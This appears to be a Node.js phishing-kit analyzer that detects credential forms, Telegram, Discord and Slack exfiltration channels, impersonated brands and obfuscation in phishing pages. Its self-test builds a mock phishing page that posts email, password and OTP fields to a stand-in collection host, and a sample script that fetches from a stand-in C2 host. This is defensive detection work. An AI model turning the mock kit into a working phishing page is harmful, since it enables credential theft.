#!/usr/bin/env node
/**
 * Phishing-Kit Analyzer — extract credential forms, exfiltration channels,
 * brands and obfuscation from a phishing page or kit bundle.
 */
import { readFile } from 'node:fs/promises'
import { analyzeSample } from '../../../tools/index.js'

export const BRANDS = ['paypal', 'microsoft', 'apple', 'amazon', 'google', 'netflix', 'bank', '银行', '支付宝', '微信']

export function analyzePhishing(source) {
  const text = String(source ?? '')
  const findings = { forms: [], actions: [], telegram: [], discord: [], slack: [], brands: [], obfuscation: [], credentials: [], risk: 0 }
  const formPattern = /<form\b[^>]*>([\s\S]*?)<\/form>/gi
  let form
  while ((form = formPattern.exec(text)) !== null) {
    const action = /action\s*=\s*["']([^"']+)["']/i.exec(form[0])?.[1] ?? ''
    const inputs = [...form[0].matchAll(/<input\b[^>]*name\s*=\s*["']([^"']+)["'][^>]*>/gi)].map((match) => match[1])
    findings.forms.push({ action, inputs })
    if (action) findings.actions.push(action)
  }
  for (const match of text.matchAll(/\b\d{8,10}:[A-Za-z0-9_-]{35}\b/g)) findings.telegram.push(match[0])
  for (const match of text.matchAll(/https:\/\/discord(?:app)?\.com\/api\/webhooks\/[^\s"']+/g)) findings.discord.push(match[0])
  for (const match of text.matchAll(/https:\/\/hooks\.slack\.com\/services\/[^\s"']+/g)) findings.slack.push(match[0])
  const lower = text.toLowerCase()
  for (const brand of BRANDS) if (lower.includes(brand)) findings.brands.push(brand)
  for (const marker of ['eval(', 'atob(', 'fromCharCode', 'Function(']) if (text.includes(marker)) findings.obfuscation.push(marker)
  for (const input of findings.forms.flatMap((entry) => entry.inputs)) {
    if (/user|email|login|account/i.test(input)) findings.credentials.push('username')
    if (/pass|pwd/i.test(input)) findings.credentials.push('password')
    if (/otp|code|2fa|mfa/i.test(input)) findings.credentials.push('otp')
  }
  findings.credentials = [...new Set(findings.credentials)]
  findings.risk = Math.min(
    100,
    findings.forms.length * 20 +
      (findings.actions.length > 0 ? 10 : 0) +
      findings.credentials.length * 10 +
      findings.telegram.length * 25 +
      findings.discord.length * 25 +
      findings.slack.length * 25 +
      findings.obfuscation.length * 5 +
      (findings.brands.length > 0 ? 10 : 0),
  )
  return findings
}

async function selfTest() {
  const kit = `<!doctype html><html><body>
    <form action="https://collect.example.net/login" method="post">
      <input name="email"><input name="password" type="password"><input name="otp">
    </form>
    <script>
      var bot = '123456789:AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEE';
      var hook = 'https://discord.com/api/webhooks/1234567890/abcdef';
      var slack = 'https://hooks.slack.com/services/T000/B000/XXXX';
      var cfg = atob('aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3Q=');
      eval(atob('Y29uc29sZS5sb2coMSk='));
    </script>
    <p>Sign in to your Microsoft account</p>
  </body></html>`
  const findings = analyzePhishing(kit)
  if (findings.forms.length !== 1) throw new Error('form extraction failed')
  if (findings.forms[0].inputs.length !== 3) throw new Error('input extraction failed')
  if (!findings.credentials.includes('otp')) throw new Error('credential classification failed')
  if (findings.telegram.length !== 1 || findings.discord.length !== 1 || findings.slack.length !== 1) throw new Error('channel extraction failed')
  if (!findings.brands.includes('microsoft')) throw new Error('brand detection failed')
  if (findings.obfuscation.length < 2) throw new Error('obfuscation detection failed')
  if (findings.risk < 60) throw new Error(`risk too low: ${findings.risk}`)
  const script = 'eval(atob("Y29uc29sZS5sb2coMSk=")); fetch("https://c2.example.test/x").catch(function(){}); localStorage.setItem("k", "1");'
  const analysis = await analyzeSample(script, { name: 'kit-script.js', logLevel: 'silent', network: { policy: 'deny' } })
  if (!['suspicious', 'malicious'].includes(analysis.report.verdict.level)) throw new Error('platform analysis failed')
  console.log(`phishing: risk=${findings.risk} forms=${findings.forms.length} channels=${findings.telegram.length + findings.discord.length + findings.slack.length} platform=${analysis.report.verdict.level}/${analysis.report.verdict.score}`)
  console.log('SELFTEST OK')
}

async function main() {
  if (process.argv.includes('--self-test')) return selfTest()
  if (process.argv.includes('--help') || !process.argv[2]) {
    console.log('Phishing-Kit Analyzer\n  <html-file> [--json]\n  --self-test')
    if (!process.argv[2]) process.exitCode = 2
    return
  }
  const source = await readFile(process.argv[2], 'utf8')
  const findings = analyzePhishing(source)
  if (process.argv.includes('--json')) {
    console.log(JSON.stringify(findings, null, 2))
    return
  }
  console.log(`risk: ${findings.risk}/100`)
  console.log(`forms: ${findings.forms.length} actions: ${findings.actions.join(', ') || 'none'}`)
  console.log(`credentials: ${findings.credentials.join(', ') || 'none'}`)
  console.log(`brands: ${findings.brands.join(', ') || 'none'}`)
  console.log(`channels: telegram=${findings.telegram.length} discord=${findings.discord.length} slack=${findings.slack.length}`)
  console.log(`obfuscation: ${findings.obfuscation.join(', ') || 'none'}`)
  if (process.argv.includes('--deep')) {
    const scripts = [...source.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/gi)].map((match) => match[1]).join('\n')
    const analysis = await analyzeSample(scripts || source, { name: process.argv[2], logLevel: 'silent', network: { policy: 'deny' } })
    console.log(`platform: ${analysis.report.verdict.level} ${analysis.report.verdict.score} | urls=${analysis.report.static.iocs.urls.length}`)
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
